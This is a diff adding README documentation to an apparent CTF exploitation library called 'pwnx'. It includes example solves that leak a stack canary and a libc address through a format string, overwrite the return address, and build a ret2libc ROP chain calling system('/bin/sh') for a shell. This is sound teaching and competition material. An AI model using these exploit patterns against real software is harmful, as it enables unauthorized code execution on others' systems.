@@ -56,6 +56,147 @@ plan.run()
 The final call depends on the libc base, the leak recipe provides it, and the
 planner schedules the leak before the shell technique.
 
+## Quick stack challenges: leaks, canaries, and ret2libc
+
+[`examples/cage.py`](examples/cage.py) is the canonical short CTF solve for a
+format-string leak followed by a canary-protected return-address overwrite:
+
+~~~python
+from pwnx import Challenge
+
+x = Challenge(
+    "./cage",
+    libc="./libc.so.6",
+    loader="./ld-linux-x86-64.so.2",
+)
+
+leaks = x.format_leak(
+    x.input.line(b"sing> "),
+    canary=9,
+    libc=11,
+    prefix=b"The canary tilts its head: ",
+    separator=b"|",
+)
+
+x.relate(x.libc.base, leaks.libc - 0x29CA8)
+
+control = x.control(
+    x.input.line(b"sing> ").return_address(
+        at=40,
+        canary=(24, leaks.canary),
+    )
+)
+
+x.want(x.shell(), via=control)
+x.run(attempts=64)
+~~~
+
+`format_leak()` builds one positional-pointer payload in the declared keyword
+order, parses the prefixed/separated response, and returns named symbolic facts
+such as `leaks.canary` and `leaks.libc`. `relate()` records the challenge-known
+address relationship without a callback. The return-address declaration places
+the canary at offset 24, preserves it inside the sparse overflow prefix, and
+starts control at offset 40. Pwnx owns packing, dependency order, libc rebasing,
+and the final ret2libc chain.
+
+`plan.show()` displays the named positions, response prefix/separator, base
+relationship, protected canary offset, return offset, and selected call goal
+without dumping exploit bytes. `plan.expand(stage)` shows the exact `%9$p|%11$p`
+exchange, prompts, codecs, sparse payload, and generated chain actions.
+
+The solve has executed successfully against the real Cage challenge. The
+opt-in Docker E2E test requires the artifact directory to contain `cage`,
+`libc.so.6`, `ld-linux-x86-64.so.2`, and `solve_pwnx.py`:
+
+~~~bash
+PWNX_CAGE_CHALLENGE=/path/to/cage-directory \
+PWNX_RUN_CTF_E2E=1 \
+pytest -q tests/test_stack_flow.py -k real_cage_solve_gets_shell
+~~~
+
+## Glass-box bytecraft
+
+Recipes remain the first choice. Use `x.craft()` when an exact byte layout is
+itself challenge knowledge—custom packets, partial pointers, hand-selected
+chains, heap metadata, or a stage that must be patched between targets.
+
+[`examples/bytecraft.py`](examples/bytecraft.py) builds a labelled symbolic
+overflow without importing packing or payload internals:
+
+~~~python
+from pwnx import Challenge
+
+x = Challenge("./chall", libc="./libc.so.6")
+
+leaks = x.input.line(b"name: ").format_leak(
+    b"%17$p|%23$p",
+    after=b"hello ",
+    separator=(b"|", b"\n"),
+    cookie="hex",
+    libc="hex",
+)
+x.relate(x.libc.base, leaks.libc - 0x29D90)
+
+overflow = (
+    x.craft("stage 2 overflow")
+    .pad_to(24, fill=b"A", label="buffer")
+    .word(leaks.cookie, label="stack cookie")
+    .pad(8, fill=b"B", label="saved frame")
+    .word(x.libc.base + 0x2A3E5, label="pop rdi")
+    .word(x.libc.base + 0x1D8698, label="/bin/sh")
+    .word(x.libc.base + 0x50D70, label="system")
+    .require(no=b"\n", max_size=0x100)
+)
+
+x.send(overflow, to=x.input.line(b"payload: "))
+x.run(attempts=64)
+~~~
+
+The canonical vocabulary is immutable and target-aware:
+
+- `raw`, `pad`, `pad_to`, `align`, and `at` place labelled regions.
+- `int`, `word`, and `ptr` encode explicit widths, endian, and partial pointers.
+- `encoded(codec, value)` reuses the symmetric codec system.
+- `require()` adds forbidden-byte, size, encoding, predicate, or reusable byte
+  constraints.
+- `replace()` returns a changed Craft and requires a reason; it never silently
+  resizes a symbolic layout.
+
+`craft.layout()` and `craft.show()` work before runtime facts resolve and list
+their dependencies. `craft.hexdump()` refuses to print placeholder bytes and
+names the missing facts; after execution, `run.payload(name)` returns a
+`PayloadArtifact` with resolved bytes, labelled layout, SHA-256, provenance,
+stage/send IDs, hexdump, and region diff support.
+
+Chained `require()` calls are monotonic: forbidden bytes are unioned, minimums
+keep the strongest lower bound, maximums keep the strongest upper bound,
+encodings and predicates all remain active, and incompatible exact/bound
+combinations fail when declared. Craft and Plan patches pass the complete final
+validation again before send—including generated ret2win/recipe payloads.
+
+`x.send(craft, to=...)` accepts a raw/line input surface, Channel, or callable
+menu operation. It lowers to the same Payload and Emit IR used by generated
+recipes. `plan.payloads()` inventories structured payloads recursively;
+`plan.payload(name)` returns the planned Craft. `plan.patch_payload(...)`
+returns an immutable plan variant, requires a reason, preserves size and
+dependencies, and participates in replay divergence and trace region/label
+diffs. This is a glass-box escape hatch, not a clone of pwntools packing/tubes.
+
+Runtime payload artifacts are immutable send-time snapshots, not objects rebuilt
+from the final fact store. They survive later fact invalidation/rebinding. If
+one symbolic Craft is sent more than once, each send receives a distinct
+artifact/send ID and preserves the bytes and provenance visible at that send.
+
+Line framing is checked after symbolic values resolve but before the payload is
+sent. Generic symbolic Craft regions participate, not only canaries. A dynamic
+per-instance region containing `\n` or a forbidden byte raises a labelled
+retryable framing error with byte and offset. A static invalid payload is a
+normal ConstraintError and is never retried. `x.run(attempts=N)` retries only
+the dynamic error against a fresh process or connection, closes failed targets,
+and records budget, attempts used, and failures in trace metadata. It does not
+retry ordinary EOF/protocol/runtime errors; explicit transports, replay, raw
+channels, or persistent targets cannot use this framing retry path.
+
 ## Environments are immutable recipes
 
 ~~~python
